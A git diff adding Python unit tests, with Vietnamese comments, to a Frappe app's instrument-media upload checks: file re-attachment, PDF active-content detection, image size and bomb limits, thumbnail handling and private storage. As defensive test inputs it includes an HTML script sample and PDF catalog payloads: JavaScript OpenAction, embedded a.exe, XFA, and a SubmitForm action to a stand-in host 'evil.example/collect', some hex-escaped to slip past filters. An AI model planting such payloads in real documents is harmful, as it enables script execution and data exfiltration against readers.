@@ -4,8 +4,10 @@ import io
 import os
 import struct
 import zlib
+from unittest.mock import patch
 
 import frappe
+from frappe.core.doctype.file.file import File
 from frappe.tests.utils import FrappeTestCase
 from PIL import Image
 
@@ -81,6 +83,60 @@ def _pdf(total_size=None):
 		padding += total_size - len(content)
 		content = _pdf_build(padding)
 	return content
+
+
+def _pdf_objstm(catalog):
+	"""PDF 1.5 có catalog (đối tượng 4) nằm trong object stream (đối tượng 3), bảng xref dạng stream (đối tượng 5)."""
+	pages = b"<< /Type /Pages /Kids [2 0 R] /Count 1 >>"
+	page = b"<< /Type /Page /Parent 1 0 R /MediaBox [0 0 200 200] >>"
+	header = b"4 0 "
+	stream = header + catalog
+	body = b"%PDF-1.5\n"
+	offsets = {}
+	for number, obj in ((1, pages), (2, page)):
+		offsets[number] = len(body)
+		body += b"%d 0 obj\n" % number + obj + b"\nendobj\n"
+	offsets[3] = len(body)
+	body += (
+		b"3 0 obj\n<< /Type /ObjStm /N 1 /First %d /Length %d >>\nstream\n" % (len(header), len(stream))
+		+ stream
+		+ b"\nendstream\nendobj\n"
+	)
+	offsets[5] = len(body)
+
+	def used(number):
+		return b"\x01" + offsets[number].to_bytes(4, "big") + b"\x00\x00"
+
+	rows = (
+		b"\x00" + b"\x00" * 4 + b"\xff\xff",
+		used(1),
+		used(2),
+		used(3),
+		b"\x02" + (3).to_bytes(4, "big") + b"\x00\x00",
+		used(5),
+	)
+	data = b"".join(rows)
+	body += (
+		b"5 0 obj\n<< /Type /XRef /Size 6 /W [1 4 2] /Root 4 0 R /Length %d >>\nstream\n" % len(data)
+		+ data
+		+ b"\nendstream\nendobj\n"
+	)
+	return body + b"startxref\n%d\n%%%%EOF\n" % offsets[5]
+
+
+def _catalog(extra):
+	return b"<< /Type /Catalog /Pages 2 0 R " + extra + b" >>"
+
+
+def _loose_file(content, file_name, is_private=1):
+	"""File chưa đính vào bản ghi nào (đính kèm rời): hook kiểm ảnh/IFU chưa chạy cho file này."""
+	return frappe.get_doc(
+		{"doctype": "File", "file_name": file_name, "content": content, "is_private": is_private}
+	).insert()
+
+
+ATTACH_IFU = {"attached_to_doctype": "Instrument", "attached_to_field": "ifu"}
+ATTACH_IMAGE = {"attached_to_doctype": "Instrument", "attached_to_field": "image"}
 
 
 def _file_doc(instrument, field, content, file_name, is_private=1):
@@ -438,3 +494,244 @@ class TestInstrumentMedia(FrappeTestCase):
 		)
 		self.assertTrue(rows[0]["thumbnail"])
 		self.assertIsNone(rows[1]["thumbnail"])
+
+	# --- fix wave Task 3: đính lại File có sẵn, PDF chủ động, chế độ ảnh, thumbnail mồ côi, file công khai cũ ---
+
+	def assertReattachRejected(self, loose, values, *fragments):
+		"""Đính lại File có sẵn vào trường ảnh/IFU bị từ chối; File và blob giữ nguyên như trước."""
+		with self.assertRaises(frappe.ValidationError) as raised:
+			frappe.client.set_value("File", loose.name, values)
+		for fragment in fragments:
+			self.assertIn(fragment, str(raised.exception))
+		row = frappe.db.get_value(
+			"File", loose.name, ["attached_to_doctype", "attached_to_field", "file_name"], as_dict=True
+		)
+		self.assertEqual((row.attached_to_doctype, row.attached_to_field), (None, None))
+		self.assertEqual(row.file_name, loose.file_name)
+		self.assertTrue(os.path.exists(loose.get_full_path()), msg=loose.file_url)
+
+	def test_reattach_existing_file_checked_like_upload(self):
+		# Review I1: File tải lên rời (chưa đính) rồi đính lại vào ifu/image phải qua đúng kiểm tra nội dung
+		make_instrument("MD-REAT")
+		html = _loose_file(b"<!DOCTYPE html><html><script>alert(1)</script></html>", "manual.txt")
+		self.assertReattachRejected(
+			html, {**ATTACH_IFU, "attached_to_name": "MD-REAT", "file_name": "x.pdf"}, "PDF"
+		)
+		big = _image("JPEG", size=(32, 32))
+		big += b"\x00" * (media.IMAGE_MAX_BYTES + 1 - len(big))
+		oversize = _loose_file(big, "big.png")
+		self.assertReattachRejected(oversize, {**ATTACH_IMAGE, "attached_to_name": "MD-REAT"}, "5 MB")
+		script_pdf = _loose_file(_pdf_build(2, PDF_JS_CATALOG), "manual.bin")
+		self.assertReattachRejected(script_pdf, {**ATTACH_IFU, "attached_to_name": "MD-REAT"}, "script")
+		thumb = _loose_file(_image("JPEG", color=(4, 44, 144)), "thumb.bin")
+		self.assertReattachRejected(
+			thumb, {**ATTACH_IMAGE, "attached_to_name": "MD-REAT", "attached_to_field": "image_thumbnail"}
+		)
+		# đổi từng trường một (đính vào dụng cụ trước, chọn trường sau) cũng bị kiểm
+		doc = frappe.get_doc("File", html.name)
+		doc.update({"attached_to_doctype": "Instrument", "attached_to_name": "MD-REAT"})
+		doc.save()
+		doc.attached_to_field = "ifu"
+		with self.assertRaises(frappe.ValidationError):
+			doc.save()
+		self.assertIsNone(frappe.db.get_value("File", html.name, "attached_to_field"))
+		# File đính vào trường ảnh đổi file_url sang blob khác cũng bị kiểm lại
+		good = attach_instrument_file("MD-REAT", "image", _image("PNG", color=(9, 9, 9)), "good.png")
+		doc = frappe.get_doc("File", good.name)
+		doc.file_url = oversize.file_url
+		with self.assertRaises(frappe.ValidationError):
+			doc.save()
+		self.assertEqual(frappe.db.get_value("File", good.name, "file_url"), good.file_url)
+
+	def test_reattach_valid_file_still_accepted(self):
+		# luồng hợp lệ: File rời đúng định dạng đính lại vào ảnh/IFU rồi gán vào dụng cụ được
+		make_instrument("MD-REOK")
+		photo = _loose_file(_image("PNG", color=(7, 70, 140)), "photo.png")
+		frappe.client.set_value("File", photo.name, {**ATTACH_IMAGE, "attached_to_name": "MD-REOK"})
+		manual = _loose_file(_pdf_build(4), "manual.pdf")
+		frappe.client.set_value("File", manual.name, {**ATTACH_IFU, "attached_to_name": "MD-REOK"})
+		doc = _set_media("MD-REOK", image=photo.file_url, ifu=manual.file_url)
+		self.assertEqual((doc.image, doc.ifu), (photo.file_url, manual.file_url))
+		self.assertTrue(doc.image_thumbnail)
+		# File đã đính lưu lại không đổi gì: không bị kiểm lại, không lỗi
+		frappe.get_doc("File", photo.name).save()
+
+	def test_instrument_rechecks_content_of_new_url(self):
+		# phòng thủ nhiều lớp: File bị gắn thẳng vào dụng cụ ở DB (bỏ qua hook File) vẫn bị Instrument.validate chặn
+		make_instrument("MD-DEEP")
+		cases = (
+			("ifu", b"<html><script>alert(1)</script></html>", "x.txt", "PDF"),
+			("ifu", _pdf_build(3, PDF_JS_CATALOG), "x.bin", "script"),
+			("image", _pdf_build(3), "x.png", "JPEG"),
+			("image", _png_header_only(50001, 50000), "bomb.png", "40"),
+		)
+		for field, content, file_name, fragment in cases:
+			with self.subTest(field=field, file_name=file_name):
+				loose = _loose_file(content, file_name)
+				frappe.db.set_value(
+					"File",
+					loose.name,
+					{
+						"attached_to_doctype": "Instrument",
+						"attached_to_name": "MD-DEEP",
+						"attached_to_field": field,
+					},
+				)
+				doc = frappe.get_doc("Instrument", "MD-DEEP")
+				doc.set(field, loose.file_url)
+				with self.assertRaises(frappe.ValidationError) as raised:
+					doc.save()
+				self.assertIn(fragment, str(raised.exception))
+				self.assertFalse(frappe.db.get_value("Instrument", "MD-DEEP", field))
+
+	def test_pdf_active_content_keys(self):
+		# Review I2: ngoài JavaScript/Launch còn file nhúng, RichMedia, XFA, mở file khác, gửi/nhập dữ liệu biểu mẫu
+		blocked = {
+			"open action javascript": b"/OpenAction << /S /JavaScript /JS (app.alert(1)) >>",
+			"embedded files": b"/Names << /EmbeddedFiles << /Names [(a.exe) << /Type /Filespec /F (a.exe) >>] >> >>",
+			"embedded file stream type": b"/X << /Type /EmbeddedFile /Length 0 >>",
+			"rich media": b"/X << /Type /Annot /Subtype /RichMedia >>",
+			"xfa": b"/AcroForm << /Fields [] /XFA (<xdp/>) >>",
+			"gotor": b"/OpenAction << /S /GoToR /F (other.pdf) /D [0 /Fit] >>",
+			"gotoe": b"/OpenAction << /S /GoToE /T << /R /C /N (a) >> >>",
+			"submit form": b"/OpenAction << /S /SubmitForm /F (https://evil.example/collect) >>",
+			"import data": b"/OpenAction << /S /ImportData /F (data.fdf) >>",
+			"hex escaped name": b"/OpenAction << /S /Submit#46orm /F (https://evil.example/collect) >>",
+			"hex escaped key": b"/Names << /Embedded#46iles << /Names [] >> >>",
+		}
+		for label, extra in blocked.items():
+			with self.subTest(label=label):
+				self.assertTrue(media.pdf_has_active_content(_pdf_build(0, _catalog(extra))))
+		# đối tượng nằm trong object stream (PDF 1.5, xref stream) cũng được duyệt
+		self.assertFalse(media.pdf_has_active_content(_pdf_objstm(b"<< /Type /Catalog /Pages 1 0 R >>")))
+		self.assertTrue(
+			media.pdf_has_active_content(
+				_pdf_objstm(b"<< /Type /Catalog /Pages 1 0 R /AcroForm << /Fields [] /XFA (x) >> >>")
+			)
+		)
+		self.assertTrue(
+			media.pdf_has_active_content(
+				_pdf_objstm(b"<< /Type /Catalog /Pages 1 0 R /OpenAction << /S /JavaScript /JS (x) >> >>")
+			)
+		)
+		# PDF sạch và liên kết web (/URI, IFU thật hay có) vẫn nhận
+		self.assertFalse(media.pdf_has_active_content(_pdf()))
+		self.assertFalse(
+			media.pdf_has_active_content(
+				_pdf_build(0, _catalog(b"/OpenAction << /S /URI /URI (https://www.example.com/ifu) >>"))
+			)
+		)
+		# tải lên: PDF có file nhúng bị từ chối, PDF sạch trong object stream được nhận
+		make_instrument("MD-PDFKEYS")
+		embedded = _pdf_build(0, _catalog(blocked["embedded files"]))
+		self.assertRejected("MD-PDFKEYS", "ifu", embedded, "embedded.bin", "embedded files")
+		clean = attach_instrument_file(
+			"MD-PDFKEYS", "ifu", _pdf_objstm(b"<< /Type /Catalog /Pages 1 0 R >>"), "clean15.pdf"
+		)
+		self.assertTrue(_set_media("MD-PDFKEYS", ifu=clean.file_url).ifu)
+
+	def _thumbnail_of(self, code, content, file_name):
+		make_instrument(code)
+		source = attach_instrument_file(code, "image", content, file_name)
+		doc = _set_media(code, image=source.file_url)
+		self.assertTrue(doc.image_thumbnail, msg=code)
+		thumb = Image.open(frappe.get_doc("File", {"file_url": doc.image_thumbnail}).get_full_path())
+		self.assertEqual((thumb.format, thumb.mode), ("JPEG", "RGB"))
+		return thumb
+
+	def test_thumbnail_from_16bit_cmyk_and_palette_images(self):
+		# Review minor: PNG xám 16 bit (I;16), JPEG CMYK, PNG bảng màu có trong suốt đều ra thumbnail đúng màu
+		buffer = io.BytesIO()
+		Image.new("I;16", (400, 300), 32768).save(buffer, format="PNG")
+		self.assertEqual(Image.open(io.BytesIO(buffer.getvalue())).mode, "I;16")
+		gray = self._thumbnail_of("MD-I16", buffer.getvalue(), "gray16.png")
+		self.assertEqual(gray.size, (320, 240))
+		self.assertTrue(
+			all(100 < value < 160 for value in gray.getpixel((160, 120))), msg=gray.getpixel((160, 120))
+		)
+
+		buffer = io.BytesIO()
+		Image.new("CMYK", (400, 300), (0, 255, 255, 0)).save(buffer, format="JPEG")
+		self.assertEqual(Image.open(io.BytesIO(buffer.getvalue())).mode, "CMYK")
+		cmyk = self._thumbnail_of("MD-CMYK", buffer.getvalue(), "cmyk.jpg")
+		red, green, blue = cmyk.getpixel((160, 120))
+		self.assertGreater(red, 200)
+		self.assertLess(max(green, blue), 80)
+
+		palette = Image.new("P", (400, 300), 0)
+		palette.putpalette([0, 0, 0, 220, 20, 20] + [0] * 762)
+		palette.paste(1, (0, 0, 200, 300))
+		buffer = io.BytesIO()
+		palette.save(buffer, format="PNG", transparency=0)
+		self.assertEqual(Image.open(io.BytesIO(buffer.getvalue())).mode, "P")
+		thumb = self._thumbnail_of("MD-PAL", buffer.getvalue(), "palette.png")
+		self.assertGreater(min(thumb.getpixel((240, 120))), 240)  # chỉ số trong suốt thành nền trắng
+		self.assertGreater(thumb.getpixel((60, 120))[0], 180)
+
+	def test_old_thumbnail_file_removed_when_image_changes(self):
+		# Review minor: thumbnail cũ không còn ai dùng → xóa bản ghi File; blob xóa sau khi commit (rollback giữ nguyên)
+		make_instrument("MD-ORPHAN")
+		first = attach_instrument_file("MD-ORPHAN", "image", _image("PNG", color=(1, 100, 1)), "a.png")
+		doc = _set_media("MD-ORPHAN", image=first.file_url)
+		old_url = doc.image_thumbnail
+		old_row = frappe.db.get_value("File", {"file_url": old_url}, "name")
+		old_path = frappe.get_doc("File", old_row).get_full_path()
+		second = attach_instrument_file("MD-ORPHAN", "image", _image("PNG", color=(1, 1, 100)), "b.png")
+		doc = _set_media("MD-ORPHAN", image=second.file_url)
+		self.assertNotEqual(doc.image_thumbnail, old_url)
+		self.assertFalse(frappe.db.exists("File", old_row))
+		self.assertTrue(os.path.exists(old_path))  # chưa commit: blob còn để rollback không làm hỏng
+		frappe.db.after_commit.run()
+		self.assertFalse(os.path.exists(old_path))
+		# Audit: lần đổi thumbnail vẫn được ghi trong Audit Log của dụng cụ
+		self.assertTrue(
+			frappe.db.exists(
+				"Audit Log", {"ref_doctype": "Instrument", "ref_name": "MD-ORPHAN", "action": "Update"}
+			)
+		)
+		# xóa ảnh: thumbnail hiện tại cũng thành mồ côi và bị xóa
+		current_row = frappe.db.get_value("File", {"file_url": doc.image_thumbnail}, "name")
+		doc = _set_media("MD-ORPHAN", image=None)
+		self.assertFalse(frappe.db.exists("File", current_row))
+
+	def test_force_private_never_leaves_public_blob(self):
+		# Review minor: ghi lại vào private lỗi giữa chừng cũng không để lại bản công khai mồ côi
+		make_instrument("MD-PUBORPHAN")
+		real_save_file = File.save_file
+		calls = []
+
+		def flaky_save_file(self, *args, **kwargs):
+			calls.append(self.is_private)
+			if len(calls) == 2:
+				raise OSError("disk full")
+			return real_save_file(self, *args, **kwargs)
+
+		content = _image("PNG", color=(3, 33, 133))
+		public_dir = frappe.get_site_path("public", "files")
+		before = set(os.listdir(public_dir))
+		with patch.object(File, "save_file", flaky_save_file):
+			with self.assertRaises(OSError):
+				_file_doc("MD-PUBORPHAN", "image", content, "pub.png", is_private=0).insert()
+		self.assertEqual(calls, [0, 1])
+		self.assertEqual(set(os.listdir(public_dir)) - before, set())
+
+	def test_legacy_public_file_stays_saveable_and_can_be_made_private(self):
+		# Review minor: File công khai trước FEAT-014 đính vào Instrument.image lưu lại được, chuyển riêng tư được
+		make_instrument("MD-LEGACY")
+		legacy = _loose_file(_image("PNG", color=(5, 50, 150)), "legacy.png", is_private=0)
+		self.assertTrue(legacy.file_url.startswith("/files/"), msg=legacy.file_url)
+		frappe.db.set_value(
+			"File", legacy.name, {**ATTACH_IMAGE, "attached_to_name": "MD-LEGACY"}, update_modified=False
+		)
+		frappe.db.set_value("Instrument", "MD-LEGACY", "image", legacy.file_url)
+		doc = frappe.get_doc("File", legacy.name)
+		doc.save()  # lưu không đổi gì
+		self.assertEqual(_set_media("MD-LEGACY", model="L1").image, legacy.file_url)
+		doc = frappe.get_doc("File", legacy.name)
+		doc.is_private = 1
+		doc.save()
+		self.assertTrue(doc.file_url.startswith("/private/files/"), msg=doc.file_url)
+		self.assertEqual(frappe.db.get_value("Instrument", "MD-LEGACY", "image"), doc.file_url)
+		# rollback cuối lớp test trả blob về thư mục công khai (Frappe on_rollback): dọn để không sót file trên đĩa
+		public_path = frappe.get_site_path("public", "files", os.path.basename(doc.file_url))
+		frappe.db.after_rollback.add(lambda: os.path.isfile(public_path) and os.remove(public_path))
